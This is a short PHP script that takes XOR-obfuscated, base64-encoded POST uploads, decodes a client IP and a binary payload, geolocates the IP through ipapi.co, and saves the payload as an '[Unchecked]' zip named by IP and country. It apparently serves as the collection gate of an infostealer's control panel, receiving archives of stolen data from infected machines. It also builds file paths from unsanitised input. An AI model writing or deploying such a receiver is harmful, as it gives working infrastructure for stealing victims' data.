<?php
include ("settings.php");

function XORCipher($data, $key) {
	$dataLen = strlen($data);
	$keyLen = strlen($key);
	$output = $data;

	for ($i = 0; $i < $dataLen; ++$i) {
		$output[$i] = $data[$i] ^ $key[$i % $keyLen];
	}

	return $output;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
    $postdata = XORCipher(base64_decode(file_get_contents('php://input'), true), $decrypt_key);
    $array = explode(":", $postdata);

    $ip = base64_decode($array[0]);
    $data =  base64_decode($array[1]);
	
    $country = trim(file_get_contents("http://ipapi.co/$ip/country_name/"));

    if (!preg_match("/^[\w]{3,100}$/u", $country))
    {
       $country = "none";
    }

    $name = "[Unchecked]" . $ip . "." . $country . ".zip";
    file_put_contents("./files/$name", $data);
}
?>